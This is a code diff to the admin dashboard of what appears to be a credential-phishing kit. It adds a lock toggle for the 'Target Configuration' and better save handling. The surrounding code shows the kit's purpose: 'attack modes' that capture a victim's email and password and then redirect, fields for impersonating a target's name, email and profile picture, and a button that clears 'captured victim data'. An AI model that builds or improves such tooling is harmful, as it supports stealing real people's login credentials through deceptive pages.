@@ -17,7 +17,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type } from "lucide-react";
+import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -55,6 +55,7 @@ export function AdminDashboard() {
   const { setTheme } = useTheme();
   const [isFormFocused, setIsFormFocused] = useState(false);
   const [activeTab, setActiveTab] = useState("live");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const {
     register,
@@ -76,6 +77,7 @@ export function AdminDashboard() {
   });
 
   const profilePictureUrl = watch("targetProfilePicture");
+  const isConfigLocked = state?.config?.isLocked ?? false;
 
   const fetchState = useCallback(async () => {
     try {
@@ -165,7 +167,8 @@ export function AdminDashboard() {
   };
 
   const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
-    let finalData = { ...data };
+    let finalData = { ...data, isLocked: isConfigLocked };
+    setIsSubmitting(true);
     try {
       if (selectedFile) {
         const uploadedUrl = await uploadImage(selectedFile);
@@ -184,21 +187,47 @@ export function AdminDashboard() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ action: "setConfig", config: finalData }),
       });
+      const resData = await res.json();
       if (res.ok) {
         toast({ title: "Success", description: "Configuration saved." });
         fetchState();
       } else {
-        throw new Error("Failed to save config");
+        throw new Error(resData.error || "Failed to save config");
+      }
+    } catch (error) {
+        const errorMessage = error instanceof Error ? error.message : "Could not save configuration.";
+        toast({
+            variant: "destructive",
+            title: "Error",
+            description: errorMessage,
+        });
+    } finally {
+        setIsSubmitting(false);
+    }
+  };
+  
+  const handleToggleLock = async () => {
+    try {
+      const res = await fetch("/api/state", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "toggleConfigLock", isLocked: !isConfigLocked }),
+      });
+      if (res.ok) {
+        toast({ title: "Success", description: `Configuration ${!isConfigLocked ? 'locked' : 'unlocked'}.` });
+        fetchState();
+      } else {
+        throw new Error("Failed to toggle lock");
       }
     } catch (error) {
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Could not save configuration.",
+        description: "Could not update lock state.",
       });
     }
   };
-  
+
   const handleClearVictimData = async () => {
     if (window.confirm("Are you sure you want to clear all captured victim data? This cannot be undone.")) {
       try {
@@ -533,29 +562,30 @@ export function AdminDashboard() {
                                     onValueChange={(value: 'auto' | 'manual' | 'semi-auto') => handleAttackModeChange(value)}
                                     value={field.value}
                                     className="grid grid-cols-1 gap-4"
+                                    disabled={isConfigLocked}
                                 >
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Auto Mode</div>
-                                           <RadioGroupItem value="auto" id="auto" />
+                                           <RadioGroupItem value="auto" id="auto" disabled={isConfigLocked}/>
                                         </div>
                                         <p className="text-sm text-muted-foreground">
                                             A streamlined flow: Email → Password → Redirect. Captures initial credentials then redirects.
                                         </p>
                                     </Label>
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Semi-Auto (Fast Catch)</div>
-                                           <RadioGroupItem value="semi-auto" id="semi-auto" />
+                                           <RadioGroupItem value="semi-auto" id="semi-auto" disabled={isConfigLocked} />
                                         </div>
                                         <p className="text-sm text-muted-foreground">
                                            A single password capture page that uses the Target Config and then redirects.
                                         </p>
                                     </Label>
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary">
+                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                          <div className="flex items-center justify-between w-full">
                                             <div className="font-semibold">Manual Mode</div>
-                                            <RadioGroupItem value="manual" id="manual" />
+                                            <RadioGroupItem value="manual" id="manual" disabled={isConfigLocked} />
                                          </div>
                                         <p className="text-sm text-muted-foreground">
                                            A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
@@ -567,19 +597,25 @@ export function AdminDashboard() {
                     </CardContent>
                  </Card>
                 <Card>
-                  <CardHeader>
-                    <CardTitle>Target Configuration</CardTitle>
-                    <CardDescription>Set up the target and simulation parameters.</CardDescription>
+                  <CardHeader className="flex flex-row items-center justify-between">
+                    <div>
+                        <CardTitle>Target Configuration</CardTitle>
+                        <CardDescription>Set up the target and simulation parameters.</CardDescription>
+                    </div>
+                    <Button variant="outline" size="icon" onClick={handleToggleLock}>
+                        {isConfigLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
+                        <span className="sr-only">{isConfigLocked ? 'Unlock' : 'Lock'}</span>
+                    </Button>
                   </CardHeader>
                   <CardContent className="space-y-4">
                       <div>
                         <Label htmlFor="targetEmail">Target Email</Label>
-                        <Input id="targetEmail" {...register("targetEmail")} />
+                        <Input id="targetEmail" {...register("targetEmail")} disabled={isConfigLocked} />
                         {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
                       </div>
                       <div>
                         <Label htmlFor="targetName">Target Name</Label>
-                        <Input id="targetName" {...register("targetName")} />
+                        <Input id="targetName" {...register("targetName")} disabled={isConfigLocked} />
                         {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
                       </div>
                       <div>
@@ -600,21 +636,21 @@ export function AdminDashboard() {
                             </div>
                           )}
                            <div className="flex-grow">
-                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} />
+                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} disabled={isConfigLocked || isUploading} />
                            </div>
                         </div>
                         {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                       </div>
                       <div>
                         <Label htmlFor="redirectUrl">Final Redirect URL</Label>
-                        <Input id="redirectUrl" {...register("redirectUrl")} />
+                        <Input id="redirectUrl" {...register("redirectUrl")} disabled={isConfigLocked} />
                         {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                       </div>
                   </CardContent>
                 </Card>
                  <div className="md:col-span-2">
-                    <Button type="submit" className="w-full h-12" disabled={isUploading}>
-                        {isUploading ? "Uploading..." : "Save Configuration"}
+                    <Button type="submit" className="w-full h-12" disabled={isUploading || isSubmitting || isConfigLocked}>
+                        {isUploading ? "Uploading..." : isSubmitting ? "Saving..." : "Save Configuration"}
                     </Button>
                  </div>
                 </form>
@@ -623,5 +659,3 @@ export function AdminDashboard() {
     </div>
   );
 }
-
-    
